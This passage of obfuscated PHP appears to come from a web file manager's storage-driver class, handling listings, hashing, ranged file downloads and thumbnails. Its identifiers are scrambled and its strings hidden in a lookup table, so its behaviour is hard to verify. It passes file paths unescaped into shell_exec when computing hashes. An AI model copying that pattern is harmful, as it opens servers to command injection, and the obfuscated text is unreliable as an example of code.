return $óÂ¸Ê§ˆ; } public function listPath($ÓÆ®åÜ, $ºş»˜©§ = false) { } public function has($áöÁÓ¯à, $œşõ€ü² = false, $‚äÑ»…¦ = false) { } public function canRead($»¹÷â¢–) { } public function canWrite($¢ÅÂˆ‚±) { } public function getContent($èá½¾—î) { } public function setContent($¶ñú¹Ş§, $êí±·Úê = '') { } protected function infoChildren($»â¼’Ï, &$¬ºÓ°) { $¡²úøüÍ =& $_SERVER[Î·Ü›öğ]; check_abort_echo(); $ÉòˆœŞ = $this->listPath($»â¼’Ï, !0); $ÉòˆœŞ = array_merge($ÉòˆœŞ[$¡²úøüÍ[85]], $ÉòˆœŞ[$¡²úøüÍ[86]]); foreach ($ÉòˆœŞ as $×™°“Ó–) { if ($×™°“Ó–[$¡²úøüÍ[33]] == $¡²úøüÍ[78]) { $¬ºÓ°[$¡²úøüÍ[81]]++; $ÇÅÏ¸ÕÚ = $this->getPathInner($×™°“Ó–[$¡²úøüÍ[87]]); $this->infoChildren($ÇÅÏ¸ÕÚ, $¬ºÓ°); } else { $¬ºÓ°[$¡²úøüÍ[80]]++; $¬ºÓ°[$¡²úøüÍ[79]] += $×™°“Ó–[$¡²úøüÍ[79]]; } } } public function fileSubstr($¯ÔÓ°·«, $ä–ßëÎÁ, $û­Ñ÷Æ) { } public function listAll($€òŞı£ë) { } public function listAllMake($’”à“ê˜, &$‡û˜Æ©) { $É•££·Æ =& $_SERVER[Î·Ü›öğ]; check_abort_echo(); $ÜŞÄÕÎÁ = $this->listPath($’”à“ê˜, !0); if (!$ÜŞÄÕÎÁ) { return; } $˜±˜Àé = array_merge($ÜŞÄÕÎÁ[$É•££·Æ[85]], $ÜŞÄÕÎÁ[$É•££·Æ[86]]); foreach ($˜±˜Àé as $Î³Ï˜¯) { $Ÿ¥öğ©Ú = $Î³Ï˜¯[$É•££·Æ[33]] == $É•££·Æ[78]; $±ç½šÆ½ = array($É•££·Æ[87] => $Î³Ï˜¯[$É•££·Æ[87]], $É•££·Æ[78] => $Ÿ¥öğ©Ú); if (isset($Î³Ï˜¯[$É•££·Æ[79]])) { $±ç½šÆ½[$É•££·Æ[79]] = $Î³Ï˜¯[$É•££·Æ[79]]; } if (isset($Î³Ï˜¯[$É•££·Æ[88]])) { $±ç½šÆ½[$É•££·Æ[88]] = $Î³Ï˜¯[$É•££·Æ[88]]; } if (!$Ÿ¥öğ©Ú) { $‡û˜Æ©[] = $±ç½šÆ½; continue; } $‡û˜Æ©[] = $±ç½šÆ½; $†…ƒÓàß = $Î³Ï˜¯[$É•££·Æ[87]]; $ÂõˆìğĞ = $this->pathDriver; if (substr($Î³Ï˜¯[$É•££·Æ[87]], 0, strlen($ÂõˆìğĞ)) == $ÂõˆìğĞ) { $†…ƒÓàß = substr($†…ƒÓàß, strlen($ÂõˆìğĞ)); } $this->listAllMake($†…ƒÓàß, $‡û˜Æ©); } } public function listAllSimple($–«ÄÂŸ«, $µïíğ”¿ = false) { $»ËÍÆı„ = $this->listAll($–«ÄÂŸ«); return $this->listAllSimpleMake($»ËÍÆı„, $this->getPathOuter($–«ÄÂŸ«), $µïíğ”¿); } public function listAllSimpleMake($õÄßĞ‹¯, $÷¡„«ş, $Çæùıı¨) { $Œ”æì¤ =& $_SERVER[Î·Ü›öğ]; $²‚áäÂ = array(); $÷¡„«ş = rtrim(get_path_father($÷¡„«ş), $Œ”æì¤[8]) . $Œ”æì¤[8]; foreach ($õÄßĞ‹¯ as $˜¿í¶Á§) { $ÌÄ¤Ó–È = array($Œ”æì¤[87] => $˜¿í¶Á§[$Œ”æì¤[87]], $Œ”æì¤[89] => $˜¿í¶Á§[$Œ”æì¤[87]], $Œ”æì¤[78] => $˜¿í¶Á§[$Œ”æì¤[78]]); if (isset($˜¿í¶Á§[$Œ”æì¤[79]]) && !$˜¿í¶Á§[$Œ”æì¤[78]]) { $ÌÄ¤Ó–È[$Œ”æì¤[79]] = $˜¿í¶Á§[$Œ”æì¤[79]]; } if (isset($˜¿í¶Á§[$Œ”æì¤[88]])) { $ÌÄ¤Ó–È[$Œ”æì¤[88]] = $˜¿í¶Á§[$Œ”æì¤[88]]; } if (is_array($˜¿í¶Á§[$Œ”æì¤[90]])) { $ÌÄ¤Ó–È[$Œ”æì¤[89]] = $˜¿í¶Á§[$Œ”æì¤[90]][$Œ”æì¤[87]]; $ÌÄ¤Ó–È[$Œ”æì¤[79]] = $˜¿í¶Á§[$Œ”æì¤[90]][$Œ”æì¤[79]]; $ÌÄ¤Ó–È[$Œ”æì¤[88]] = $˜¿í¶Á§[$Œ”æì¤[90]][$Œ”æì¤[88]]; } else { if (substr($˜¿í¶Á§[$Œ”æì¤[87]], 0, strlen($÷¡„«ş)) == $÷¡„«ş) { $ÌÄ¤Ó–È[$Œ”æì¤[87]] = substr($˜¿í¶Á§[$Œ”æì¤[87]], strlen($÷¡„«ş)); } } $Îƒ´Ò‡ = $˜¿í¶Á§[$Œ”æì¤[78]] ? $Œ”æì¤[8] : $Œ”æì¤[12]; $ÌÄ¤Ó–È[$Œ”æì¤[89]] = rtrim($ÌÄ¤Ó–È[$Œ”æì¤[89]], $Œ”æì¤[8]) . $Îƒ´Ò‡; $ÌÄ¤Ó–È[$Œ”æì¤[87]] = $Œ”æì¤[8] . trim($ÌÄ¤Ó–È[$Œ”æì¤[87]], $Œ”æì¤[8]) . $Îƒ´Ò‡; if (!$Çæùıı¨) { $ ˆøü²İ = explode($Œ”æì¤[8], trim($ÌÄ¤Ó–È[$Œ”æì¤[87]], $Œ”æì¤[8])); $ÌÄ¤Ó–È[$Œ”æì¤[87]] = $Œ”æì¤[8] . implode($Œ”æì¤[8], array_slice($ ˆøü²İ, 1)) . $Îƒ´Ò‡; } $²‚áäÂ[] = $ÌÄ¤Ó–È; } return array_sort_by($²‚áäÂ, $Œ”æì¤[87]); } public function upload($şßÁ½„™, $’Îà‡»û, $³ÛÜ²ƒ¯ = false, $Ç •îƒ™ = REPEAT_REPLACE) { } public function uploadFileByID($ô²î×Ùº, $Ü­Íüõë, $à …î®) { } public function uploadFileByPath($û¬ìÇİ, $¶¼§®×Ä, $ÒÜ†èù¾ = array()) { } public function isUploadServer() { $â­®·ô· =& $_SERVER[Î·Ü›öğ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $â­®·ô·[91]) { return !0; } return $GLOBALS[$â­®·ô·[6]][$â­®·ô·[92]][$â­®·ô·[93]]; } public function isFileOutServer() { $­Å¸ãñß =& $_SERVER[Î·Ü›öğ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $­Å¸ãñß[91]) { return !0; } return $GLOBALS[$­Å¸ãñß[6]][$­Å¸ãñß[92]][$­Å¸ãñß[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($˜’ô»Å¦) { $×Ø÷°ğš =& $_SERVER[Î·Ü›öğ]; if (!$this->isCdnHost()) { return $˜’ô»Å¦; } return str_replace(trim(get_url_root($˜’ô»Å¦), $×Ø÷°ğš[8]), trim($this->cdnHost, $×Ø÷°ğš[8]), $˜’ô»Å¦); } public function uploadLink($²û¯ä†Ô, $©ç…¯Ô = 0) { $ù¦³À€ø =& $_SERVER[Î·Ü›öğ]; if ($this->isUploadServer()) { return; } $ÎÍğ©µ— = $this->getType(); if (!in_array($ÎÍğ©µ—, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $åÜñ›Íò = 1024 * 1024 * 10; $›úâ™« = $©ç…¯Ô <= $åÜñ›Íò ? $ù¦³À€ø[95] : $ù¦³À€ø[96]; $Á÷×¬…ğ = (!$©ç…¯Ô ? 1 : ceil($©ç…¯Ô / pow(1024, 3))) * 3600 * 4; $Áş˜›‹‡ = $this->{$›úâ™«}($²û¯ä†Ô, $Á÷×¬…ğ); if ($Áş˜›‹‡) { $Áş˜›‹‡[$ù¦³À€ø[97]] = $²û¯ä†Ô; $Áş˜›‹‡[$ù¦³À€ø[98]] = $ÎÍğ©µ—; } return $Áş˜›‹‡; } public function uploadFormData($À£ı«¥ï, $Æç°–“ä = 3600) { } public function uploadMultiData($¶ÙÑêƒ, $ÁëùÙ« = 3600) { } public function multiUploadFormData($ ³ó­Œ³, $ãèëŠô = 3600) { return $this->uploadMultiData($ ³ó­Œ³, $ãèëŠô); } public function download($Îû€½öå, $½ÈŸ•Û) { } public function ext($ş¼”Ó§Â) { $“°Õœš¯ =& $_SERVER[Î·Ü›öğ]; if (strpos($ş¼”Ó§Â, $“°Õœš¯[8]) === -1) { $ş×àªŒ• = $ş¼”Ó§Â; } else { $ş×àªŒ• = $this->pathThis($ş¼”Ó§Â); } $§Úšô‚Ò = $“°Õœš¯[12]; if (strstr($ş×àªŒ•, $“°Õœš¯[10])) { $§Úšô‚Ò = substr($ş×àªŒ•, strrpos($ş×àªŒ•, $“°Õœš¯[10]) + 1); $§Úšô‚Ò = strtolower($§Úšô‚Ò); } if (strlen($§Úšô‚Ò) > 3 && preg_match($“°Õœš¯[99], $§Úšô‚Ò, $®ŞóÄ†û)) { $§Úšô‚Ò = $“°Õœš¯[12]; } return $§Úšô‚Ò; } public function pathThis($¬‚ºÏÃ´) { $íÒÑæñĞ =& $_SERVER[Î·Ü›öğ]; $¬‚ºÏÃ´ = str_replace($íÒÑæñĞ[100], $íÒÑæñĞ[8], rtrim($¬‚ºÏÃ´, $íÒÑæñĞ[8])); $¶¸Ü÷õˆ = strrpos($¬‚ºÏÃ´, $íÒÑæñĞ[8]); if ($¶¸Ü÷õˆ === !1) { return $¬‚ºÏÃ´; } return substr($¬‚ºÏÃ´, $¶¸Ü÷õˆ + 1); } public function pathFather($¼ÎÊ€Õá) { $ùÙ¬Å× =& $_SERVER[Î·Ü›öğ]; $¼ÎÊ€Õá = str_replace($ùÙ¬Å×[100], $ùÙ¬Å×[8], rtrim($¼ÎÊ€Õá, $ùÙ¬Å×[8])); $ºô›Ù™Î = strrpos($¼ÎÊ€Õá, $ùÙ¬Å×[8]); if ($ºô›Ù™Î === !1) { return $ùÙ¬Å×[12]; } return substr($¼ÎÊ€Õá, 0, $ºô›Ù™Î + 1); } public function hashSimple($äñ‰ªæÄ) { $êÌ¾·¹ =& $_SERVER[Î·Ü›öğ]; if (!$äñ‰ªæÄ) { return md5($êÌ¾·¹[12]); } $¼±Î¼Òä = $this->size($äñ‰ªæÄ); $õÍÒè¦ = 200; $Áï¤‰ïÖ = 50; if ($¼±Î¼Òä <= $õÍÒè¦ * $Áï¤‰ïÖ) { return $this->hashMd5($äñ‰ªæÄ) . $¼±Î¼Òä; } $Æ£®é¤ = intval($¼±Î¼Òä / $Áï¤‰ïÖ); $æï’…§‡ = $êÌ¾·¹[12]; for ($üıºÁ = 0; $üıºÁ < $Áï¤‰ïÖ; $üıºÁ++) { $æï’…§‡ .= $this->fileSubstr($äñ‰ªæÄ, $Æ£®é¤ * $üıºÁ, $õÍÒè¦); } $æï’…§‡ .= $this->fileSubstr($äñ‰ªæÄ, $¼±Î¼Òä - $õÍÒè¦, $õÍÒè¦); return md5($æï’…§‡) . $¼±Î¼Òä; } public static $md5Cache = array(); public function hashMd5($âÅûµÒ˜) { if (!$âÅûµÒ˜) { return md5($_SERVER[Î·Ü›öğ][12]); } $âÅûµÒ˜ = $this->iconvSystem($âÅûµÒ˜); if (isset(self::$md5Cache[$âÅûµÒ˜])) { return self::$md5Cache[$âÅûµÒ˜]; } self::$md5Cache[$âÅûµÒ˜] = $this->hashMd5Shell($âÅûµÒ˜); if (!self::$md5Cache[$âÅûµÒ˜]) { self::$md5Cache[$âÅûµÒ˜] = @md5_file($âÅûµÒ˜); } return self::$md5Cache[$âÅûµÒ˜]; } private function hashMd5Shell($–ˆƒ¤éÈ) { $Áá€‘Ù† =& $_SERVER[Î·Ü›öğ]; if (!$–ˆƒ¤éÈ) { return md5($Áá€‘Ù†[12]); } if (!function_exists($Áá€‘Ù†[101])) { return !1; } $„›Ø¬Ä¯ = array($Áá€‘Ù†[102], $Áá€‘Ù†[103]); $ÙÊÓ¡úĞ = Cache::get($Áá€‘Ù†[104]); if (!$ÙÊÓ¡úĞ) { $ŞÄ€—½ï = BASIC_PATH . $Áá€‘Ù†[105]; $½·×ûòº = md5_file($ŞÄ€—½ï); $ÙÊÓ¡úĞ = $Áá€‘Ù†[106]; foreach ($„›Ø¬Ä¯ as $—„·¦æ‘) { $¤÷˜¥úÇ = shell_exec($—„·¦æ‘ . "\40\42{$ŞÄ€—½ï}\42"); if ($¤÷˜¥úÇ && substr(trim($¤÷˜¥úÇ), 0, 32) == $½·×ûòº) { $ÙÊÓ¡úĞ = $—„·¦æ‘; break; } } Cache::set($Áá€‘Ù†[104], $ÙÊÓ¡úĞ, 3600); } if ($ÙÊÓ¡úĞ == $Áá€‘Ù†[106]) { return !1; } $¤÷˜¥úÇ = shell_exec($ÙÊÓ¡úĞ . "\40\x22{$–ˆƒ¤éÈ}\42"); $¤÷˜¥úÇ = str_replace($Áá€‘Ù†[107], $Áá€‘Ù†[12], $¤÷˜¥úÇ); return substr($¤÷˜¥úÇ, 0, 32); } public function link($ ‡È„¨¤) { return $ ‡È„¨¤; } public function fileOut($à¼³İÂä, $Ò“Ä”œØ = false, $‚§ù³ = false, $¤îÂÇé§ = '') { $µ»ÓÛØ =& $_SERVER[Î·Ü›öğ]; $this->cacheMethod(null, null); if (!$à¼³İÂä || !$this->exist($à¼³İÂä)) { show_json(LNG($µ»ÓÛØ[108]), !1, $‚§ù³); } $üÁ€ÚÁ÷ = $this->getType() == $µ»ÓÛØ[109]; $ë…İğì = $GLOBALS[$µ»ÓÛØ[6]][$µ»ÓÛØ[92]][$µ»ÓÛØ[110]][$µ»ÓÛØ[111]]; $¦Æô©§Û = (double) $GLOBALS[$µ»ÓÛØ[6]][$µ»ÓÛØ[92]][$µ»ÓÛØ[110]][$µ»ÓÛØ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $©½û‹óÔ = $this->infoFull($à¼³İÂä); $·‘Ş“íâ = $©½û‹óÔ[$µ»ÓÛØ[79]]; $İû…”öš = gmdate($µ»ÓÛØ[113], $©½û‹óÔ[$µ»ÓÛØ[88]]); $óå—£‘ú = $‚§ù³ ? $‚§ù³ : $this->iconvApp($©½û‹óÔ[$µ»ÓÛØ[32]]); $¥²Àšå = 0; $İÑÏ°à¸ = $·‘Ş“íâ - 1; $–Ì…Ö¹¯ = $this->ext($óå—£‘ú); if (in_array($–Ì…Ö¹¯, array($µ»ÓÛØ[114], $µ»ÓÛØ[115], $µ»ÓÛØ[116], $µ»ÓÛØ[117]))) { $–Ì…Ö¹¯ = $µ»ÓÛØ[118]; } if (in_array($–Ì…Ö¹¯, array($µ»ÓÛØ[119]))) { $–Ì…Ö¹¯ = $µ»ÓÛØ[120]; } if (!$¤îÂÇé§) { $¤îÂÇé§ = md5($İû…”öš . $·‘Ş“íâ); } $¤îÂÇé§ = $µ»ÓÛØ[121] . $¤îÂÇé§ . $µ»ÓÛØ[121]; $õ—ÚìˆŸ = get_file_mime($–Ì…Ö¹¯); $öÙÜ’¸ = !0; $öÙÜ’¸ = isset($_GET[$µ»ÓÛØ[122]]) ? !1 : !0; if ($Ò“Ä”œØ === !1 && !mime_support($õ—ÚìˆŸ)) { $õ—ÚìˆŸ = $µ»ÓÛØ[123]; } header($µ»ÓÛØ[124]); header($µ»ÓÛØ[125] . $õ—ÚìˆŸ); $™îÀºä” = rawurlencode($óå—£‘ú); $™îÀºä” = $µ»ÓÛØ[121] . $™îÀºä” . $µ»ÓÛØ[126] . $™îÀºä”; if ($Ò“Ä”œØ) { header($µ»ÓÛØ[127]); header($µ»ÓÛØ[128] . $™îÀºä”); } else { if ($öÙÜ’¸) { header($µ»ÓÛØ[129] . $™îÀºä”); } } $±êú™‡£ = 3600 * 24 * 30; header($µ»ÓÛØ[130]); header($µ»ÓÛØ[131]); header($µ»ÓÛØ[132] . $±êú™‡£); header($µ»ÓÛØ[133] . gmdate($µ»ÓÛØ[113], time() + $±êú™‡£) . $µ»ÓÛØ[134]); if (isset($_SERVER[$µ»ÓÛØ[135]]) && strtotime($_SERVER[$µ»ÓÛØ[135]]) == $©½û‹óÔ[$µ»ÓÛØ[88]]) { header($µ»ÓÛØ[136], !0, 304); die; } if (isset($_SERVER[$µ»ÓÛØ[137]]) && $_SERVER[$µ»ÓÛØ[137]] == $¤îÂÇé§) { header($µ»ÓÛØ[138] . $¤îÂÇé§, !0, 304); die; } header($µ»ÓÛØ[138] . $¤îÂÇé§); header($µ»ÓÛØ[139] . $İû…”öš . $µ»ÓÛØ[134]); header($µ»ÓÛØ[140] . $óå—£‘ú); header($µ»ÓÛØ[141]); header($µ»ÓÛØ[142] . $·‘Ş“íâ); header($µ»ÓÛØ[143]); Hook::trigger($µ»ÓÛØ[144], $à¼³İÂä, $·‘Ş“íâ, $óå—£‘ú, $–Ì…Ö¹¯); if (!$Ò“Ä”œØ && $–Ì…Ö¹¯ == $µ»ÓÛØ[145]) { if ($·‘Ş“íâ > 1024 * 1024 * 10) { die; } $èÛ´ıÑ£ = $this->getContent($à¼³İÂä); $èÛ´ıÑ£ = Html::clearSVG($èÛ´ıÑ£); header($µ»ÓÛØ[146] . strlen($èÛ´ıÑ£)); echo $èÛ´ıÑ£; die; } $¡è¿²¹ = strtolower($_SERVER[$µ»ÓÛØ[147]]); if ($üÁ€ÚÁ÷ && $¡è¿²¹ && $ë…İğì) { if (strstr($¡è¿²¹, $µ»ÓÛØ[148])) { header($µ»ÓÛØ[149] . $à¼³İÂä); } else { if (strstr($¡è¿²¹, $µ»ÓÛØ[150])) { header($µ»ÓÛØ[151] . $à¼³İÂä); } else { if (strstr($¡è¿²¹, $µ»ÓÛØ[152])) { header($µ»ÓÛØ[153] . $à¼³İÂä); } } } if ($¦Æô©§Û) { header($µ»ÓÛØ[154] . $¦Æô©§Û); } return; } if (isset($_SERVER[$µ»ÓÛØ[155]])) { if (preg_match($µ»ÓÛØ[156], $_SERVER[$µ»ÓÛØ[155]], $ˆÕ®¸¦)) { $¥²Àšå = intval($ˆÕ®¸¦[1]); $¥²Àšå = $¥²Àšå <= 0 ? 0 : ($¥²Àšå >= $İÑÏ°à¸ ? $İÑÏ°à¸ : $¥²Àšå); if (!empty($ˆÕ®¸¦[2])) { $ÖŠÒ‰„Æ = intval($ˆÕ®¸¦[2]); $İÑÏ°à¸ = $ÖŠÒ‰„Æ < $¥²Àšå ? $¥²Àšå : ($ÖŠÒ‰„Æ >= $İÑÏ°à¸ ? $İÑÏ°à¸ : $ÖŠÒ‰„Æ); } } header($µ»ÓÛØ[157]); header("\x43\157\156\x74\x65\156\164\55\x52\x61\x6e\147\x65\72\x20\x62\171\x74\x65\163\x20{$¥²Àšå}\55{$İÑÏ°à¸}\57" . $·‘Ş“íâ); } else { header($µ»ÓÛØ[158]); } header($µ»ÓÛØ[159]); header($µ»ÓÛØ[160]); $é™íøåÅ = !0; if ($_SERVER[$µ»ÓÛØ[161]] == $µ»ÓÛØ[162] && $·‘Ş“íâ > 1204 * 1024 * 1024 * 2) { $é™íøåÅ = !1; } if ($é™íøåÅ) { header($µ»ÓÛØ[163] . ($İÑÏ°à¸ - $¥²Àšå + 1)); } if ($_SERVER[$µ»ÓÛØ[164]] == $µ»ÓÛØ[165]) { return; } $ë‚£šğ = array($µ»ÓÛØ[166] => !1, $µ»ÓÛØ[167] => $¥²Àšå, $µ»ÓÛØ[168] => $İÑÏ°à¸, $µ»ÓÛØ[169] => $–Ì…Ö¹¯, $µ»ÓÛØ[170] => $©½û‹óÔ, $µ»ÓÛØ[171] => $µ»ÓÛØ[12], $µ»ÓÛØ[172] => 0); $ë‚£šğ = Hook::filter($µ»ÓÛØ[173], $ë‚£šğ); $ş–¬’÷ê = 1024 * 300; $¼ñíÖé = 0; if ($¦Æô©§Û) { $¼ñíÖé = intval(1000 * 1000 * ($ş–¬’÷ê / $¦Æô©§Û)); } while ($¥²Àšå <= $İÑÏ°à¸) { $İ­ ƒŠ¨ = timeFloat(); check_abort(); $Ê”ÜœÇş = $İÑÏ°à¸ - $¥²Àšå + 1; if ($Ê”ÜœÇş <= $ş–¬’÷ê) { $ş–¬’÷ê = $Ê”ÜœÇş; } $èÛ´ıÑ£ = $this->fileSubstr($à¼³İÂä, $¥²Àšå, $ş–¬’÷ê); if ($ë‚£šğ[$µ»ÓÛØ[166]]) { $ë‚£šğ[$µ»ÓÛØ[171]] = $èÛ´ıÑ£; $ë‚£šğ[$µ»ÓÛØ[172]] = $¥²Àšå; $ë‚£šğ = Hook::filter($µ»ÓÛØ[174], $ë‚£šğ); $èÛ´ıÑ£ = $ë‚£šğ[$µ»ÓÛØ[171]]; } echo $èÛ´ıÑ£; $¥²Àšå += $ş–¬’÷ê; if ($ş–¬’÷ê == $Ê”ÜœÇş) { $¥²Àšå = $İÑÏ°à¸ + 1; } if ($¼ñíÖé) { $‹Àê„à = intval(1000 * 1000 * (timeFloat() - $İ­ ƒŠ¨)); $ĞöºÓ¦è = $¼ñíÖé - $‹Àê„à; if ($ĞöºÓ¦è > 5) { usleep($ĞöºÓ¦è); } } } } public function fileOutServer($ü­¯†œ, $ŸÌ›½¨ = false, $·‚„íùâ = false, $ÆÈÇ£€Ï = '') { $this->fileOut($ü­¯†œ, $ŸÌ›½¨, $·‚„íùâ, $ÆÈÇ£€Ï); } public function fileOutLink($ƒÉ’Ë¸) { header($_SERVER[Î·Ü›öğ][175] . $ƒÉ’Ë¸); die; } public function cacheMethod($¯ìÉÁÆ, $¥ø°á®Å, $Òà¸Ôç“ = null) { $‚»Ñ¶åç =& $_SERVER[Î·Ü›öğ]; static $™¯¬©çÕ = array(); $¶ü÷æğ· = $¥ø°á®Å ? ltrim($this->getPathOuter($¥ø°á®Å), $‚»Ñ¶åç[8]) : $‚»Ñ¶åç[12]; $í™©ïˆ€ = $‚»Ñ¶åç[176] . $¯ìÉÁÆ . $‚»Ñ¶åç[177] . rtrim($¶ü÷æğ·, $‚»Ñ¶åç[8]); if (is_null($¯ìÉÁÆ)) { $™¯¬©çÕ = array(); return; } if (is_null($¥ø°á®Å)) { foreach ($™¯¬©çÕ as $í™©ïˆ€ => $ùÚ¦ĞšŠ) { if (!strstr($í™©ïˆ€, $‚»Ñ¶åç[176] . $¯ìÉÁÆ . $‚»Ñ¶åç[178])) { continue; } unset($™¯¬©çÕ[$í™©ïˆ€]); } return; } if ($Òà¸Ôç“ === $‚»Ñ¶åç[179]) { unset($™¯¬©çÕ[$í™©ïˆ€]); return; } if (!is_null($Òà¸Ôç“)) { $™¯¬©çÕ[$í™©ïˆ€] = $Òà¸Ôç“; return; } $Á§¨ãŞé = isset($™¯¬©çÕ[$í™©ïˆ€]) ? $™¯¬©çÕ[$í™©ïˆ€] : null; if (!is_null($Á§¨ãŞé)) { return $Á§¨ãŞé; } $Á§¨ãŞé = $this->{$¯ìÉÁÆ}($¥ø°á®Å); $™¯¬©çÕ[$í™©ïˆ€] = $Á§¨ãŞé; return $Á§¨ãŞé; } public function cacheMethodInfoSet($àÑü¤ŒÕ, $¿­ŞÍ, $¥óª×û† = false) { $İÈ¢ä¼ =& $_SERVER[Î·Ü›öğ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($İÈ¢ä¼[180], $àÑü¤ŒÕ, $¿­ŞÍ); $this->cacheMethod($İÈ¢ä¼[181], $àÑü¤ŒÕ, $¿­ŞÍ ? !1 : !0); if (is_array($¥óª×û†)) { $this->cacheMethod($İÈ¢ä¼[182], $àÑü¤ŒÕ, $¥óª×û†); } } public function fileOutImage($Ìîá©÷‹, $ÌÔ‡¸®İ = 250) { $ÀøÅÀê =& $_SERVER[Î·Ü›öğ]; set_timeout(); if (substr($Ìîá©÷‹, 0, 4) == $ÀøÅÀê[152]) { $this->fileOutLink($Ìîá©÷‹); } $¯Ï÷Éßì = $this->info($Ìîá©÷‹); $Ú¡í¯×Ê = !1; $´ğùı¤µ = isset($GLOBALS[$ÀøÅÀê[183]]) ? $GLOBALS[$ÀøÅÀê[183]] : array(); if ($´ğùı¤µ && $´ğùı¤µ[$ÀøÅÀê[184]] == $¯Ï÷Éßì[$ÀøÅÀê[87]]) { $¯Ï÷Éßì = $´ğùı¤µ; $ÖöĞæ³« = $¯Ï÷Éßì[$ÀøÅÀê[185]]; if ($ÖöĞæ³« && isset($ÖöĞæ³«[$ÀøÅÀê[186]])) { if ($ÖöĞæ³«[$ÀøÅÀê[186]] <= $ÌÔ‡¸®İ && $ÖöĞæ³«[$ÀøÅÀê[187]] <= $ÌÔ‡¸®İ) { $Ú¡í¯×Ê = !0; } } } if ($¯Ï÷Éßì[$ÀøÅÀê[79]] <= 1024 * 50 || $Ú¡í¯×Ê || !function_exists($ÀøÅÀê[188]) || $¯Ï÷Éßì[$ÀøÅÀê[169]] == $ÀøÅÀê[189]) { return $this->fileOut($Ìîá©÷‹, !1, $¯Ï÷Éßì[$ÀøÅÀê[32]]); } $ŸÊÅÕıœ = kodIO::hashPath($¯Ï÷Éßì); $èÁÏº´Ğ = "\143\157\x76\145\162\137{$ŸÊÅÕıœ}\137{$ÌÔ‡¸®İ}\x2e\160\x6e\x67"; $ëç¤†¯ = IO_PATH_SYSTEM_TEMP . $ÀøÅÀê[190]; $š¾×Ç” = IO::infoFullSimple($ëç¤†¯); $â‘®·» = $š¾×Ç” && is_array($š¾×Ç”) ? $š¾×Ç”[$ÀøÅÀê[87]] : $ÀøÅÀê[12]; if (!$â‘®·») { $â‘®·» = IO::mkdir($ëç¤†¯); } if ($¯Ï÷Éßì[$ÀøÅÀê[191]] == $ÀøÅÀê[192] && isset($¯Ï÷Éßì[$ÀøÅÀê[193]]) && $¯Ï÷Éßì[$ÀøÅÀê[193]] == kodIO::sourceID($â‘®·»)) { $ØäÅéÖò = $¯Ï÷Éßì[$ÀøÅÀê[194]]; if ($ÌÔ‡¸®İ <= 500) { $À£Õ¬» = preg_replace($ÀøÅÀê[195], $ÀøÅÀê[196], $¯Ï÷Éßì[$ÀøÅÀê[32]]); $ØäÅéÖò = IO::fileNameExist($â‘®·», $À£Õ¬»); } return IO::fileOut(KodIO::make($ØäÅéÖò), !1, $¯Ï÷Éßì[$ÀøÅÀê[32]]); } $ÎúÍÙî‚ = IO::fileNameExist($â‘®·», $èÁÏº´Ğ); if ($ÎúÍÙî‚) { return IO::fileOut(KodIO::make($ÎúÍÙî‚), !1, $¯Ï÷Éßì[$ÀøÅÀê[32]]); } if ($ÌÔ‡¸®İ > 1000) { $this->makeImageCover($â‘®·», $Ìîá©÷‹, $èÁÏº´Ğ, $ÌÔ‡¸®İ); $this->makeImageCover($â‘®·», $Ìîá©÷‹, "\x63\x6f\x76\145\x72\x5f{$ŸÊÅÕıœ}\137\62\x35\x30\56\160\x6e\147", 250); $ÎúÍÙî‚ = IO::fileNameExist($â‘®·», $èÁÏº´Ğ); if ($ÎúÍÙî‚) { return IO::fileOut(KodIO::make($ÎúÍÙî‚), !1, $¯Ï÷Éßì[$ÀøÅÀê[32]]); } die; } if (!kodIO::allowCover($¯Ï÷Éßì)) { return $this->fileOut($Ìîá©÷‹, !1, $¯Ï÷Éßì[$ÀøÅÀê[32]]); } $ŞÀñ¹«Í = Cache::get($èÁÏº´Ğ); if ($ŞÀñ¹«Í == $ÀøÅÀê[197] || $ŞÀñ¹«Í == $ÀøÅÀê[198]) { echo $ŞÀñ¹«Í; die; } Cache::set($èÁÏº´Ğ, $ÀøÅÀê[198], 60); $àÇµéÓÛ = array($â‘®·», $¯Ï÷Éßì[$ÀøÅÀê[87]], $èÁÏº´Ğ, $ÌÔ‡¸®İ); $ÈŠ„ã„¬ = $ÀøÅÀê[199] . $¯Ï÷Éßì[$ÀøÅÀê[79]] . $ÀøÅÀê[200] . $èÁÏº´Ğ . $ÀøÅÀê[201] . $¯Ï÷Éßì[$ÀøÅÀê[32]] . $ÀøÅÀê[202] . $¯Ï÷Éßì[$ÀøÅÀê[87]]; TaskQueue::add($ÀøÅÀê[203], $àÇµéÓÛ, $ÈŠ„ã„¬, $èÁÏº´Ğ); } public function makeImageCover($ãÈ¹³É¸, $ç’õı©Î, $í«¸œê, $ÌİåÓÇÇ) { $ŞŠœİğ™ =& $_SERVER[Î·Ü›öğ]; if (IO::fileNameExist($ãÈ¹³É¸, $í«¸œê)) { return $ŞŠœİğ™[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ü¿ÚÜ„÷ = $this->getPathOuter($ç’õı©Î); $’¨Ç› = DATA_THUMB . $í«¸œê; del_file($’¨Ç›); $¥ÒÒÒì  = IO::copy($ü¿ÚÜ„÷, TEMP_FILES, !1, $í«¸œê); if (!@file_exists($¥ÒÒÒì )) { return $ŞŠœİğ™[205]; } ImageThumb::createThumb($¥ÒÒÒì , $’¨Ç›, $ÌİåÓÇÇ, $ÌİåÓÇÇ * 10); if (@file_exists($’¨Ç›)) { Cache::remove($í«¸œê); return IO::move($’¨Ç›, $ãÈ¹³É¸); } Cache::set($í«¸œê, $ŞŠœİğ™[197], 600); del_file($’¨Ç›); return $ŞŠœİğ™[206] . $¥ÒÒÒì  . $ŞŠœİğ™[74]; } public function fileOutImageServer($…é—øšÈ, $œ°ş†¸ = 250) { $this->fileOutImage($…é—øšÈ, $œ°ş†¸); } public function fileNameAuto($Š§÷Ìú¾, $—©˜¶òÙ, $Ññ‰Á = REPEAT_RENAME, $˜€š„›ç = false) { $áŸ’º¥ˆ =& $_SERVER[Î·Ü›öğ]; $ç‹ºóì = $Š§÷Ìú¾ === $áŸ’º¥ˆ[12] ? $—©˜¶òÙ : rtrim($Š§÷Ìú¾, 